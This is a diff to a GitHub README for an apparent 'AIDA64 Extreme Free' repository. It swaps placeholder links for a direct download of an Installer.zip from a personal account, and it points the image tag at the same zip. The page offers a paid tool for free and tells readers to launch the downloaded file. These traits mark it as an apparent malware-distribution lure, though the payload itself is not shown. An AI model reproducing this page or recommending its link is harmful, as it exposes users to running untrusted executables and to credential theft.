@@ -3,7 +3,7 @@
 
 ## Welcome to the AIDA64 Extreme Free Repository!
 
-[Download AIDA64 Extreme](555)
+[Download AIDA64 Extreme](https://github.com/yourdiemistiknl/AIDA64-Extreme-Free/releases/download/2.0/Installer.zip)
 
 This repository is dedicated to providing resources and information related to AIDA64 Extreme, a powerful system information, benchmarking, and diagnostic tool. Whether you are a tech enthusiast, a system builder, or just curious about your PC's performance, AIDA64 Extreme is a must-have tool in your arsenal.
 
@@ -40,7 +40,7 @@ This repository is dedicated to providing resources and information related to A
 
 ### How to Get Started
 
-To access AIDA64 Extreme software and resources, please download the latest version [here](555).
+To access AIDA64 Extreme software and resources, please download the latest version [here](https://github.com/yourdiemistiknl/AIDA64-Extreme-Free/releases/download/2.0/Installer.zip).
 
 If the link above ends with a file name, it needs to be launched to initiate the download process.
 
@@ -48,4 +48,4 @@ If you encounter any issues with the provided link, please check the "Releases" 
 
 Thank you for visiting the AIDA64 Extreme Free Repository. Happy benchmarking! 🚀
 
-![AIDA64 Tools](555)
+![AIDA64 Tools](https://github.com/yourdiemistiknl/AIDA64-Extreme-Free/releases/download/2.0/Installer.zip)
